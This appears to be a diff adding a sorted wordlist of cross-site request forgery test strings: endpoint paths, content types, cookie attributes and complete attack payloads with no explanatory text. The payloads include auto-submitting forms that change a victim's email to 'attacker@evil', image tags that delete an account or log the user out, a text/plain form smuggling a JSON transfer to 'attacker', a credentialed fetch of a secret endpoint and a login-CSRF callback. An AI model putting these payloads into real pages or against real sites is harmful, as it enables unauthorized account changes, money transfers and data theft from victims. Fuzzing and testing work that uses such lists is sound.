@@ -1,0 +1,34 @@
+/account/delete?id=42
+/admin/disable_user?u=victim
+/api/health
+/api/v1/account/delete
+/auth/callback?code=...&state=...
+/login
+/transfer?to=x&amount=100
+<a href="https://target/transfer?to=attacker&amount=100">Click for prize</a>
+<form action="https://target/api/transfer" method="POST" enctype="text/plain"><input name='{"to":"attacker","amount":100,"x":"' value='ignore"}'></form>
+<form action="https://target/settings" method="POST"><input name="email" value="attacker@evil"></form><script>document.forms[0].submit()</script>
+<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<form>..."></iframe>
+<img src="https://target/account/delete?id=42">
+<img src="https://target/logout">
+<img>
+<input name="csrf_token" value="STATIC_VALUE">
+<meta name="referrer" content="no-referrer">
+Access-Control-Allow-Origin: <reflected request origin>
+Authorization: Bearer <jwt>
+Content-Type: application/json
+Content-Type: text/plain
+Domain=.target.tld
+SameSite=Lax
+SameSite=None
+_method=DELETE
+application/json
+application/x-www-form-urlencoded
+enctype="text/plain"
+fetch('https://target/api/secret', {credentials: 'include'})
+file://
+https://target/auth/callback?code=<attacker_code>
+multipart/form-data
+text/plain
+window.location = 'https://target/action?...'
+{"to":"attacker","amount":100,"x":"=ignore"}
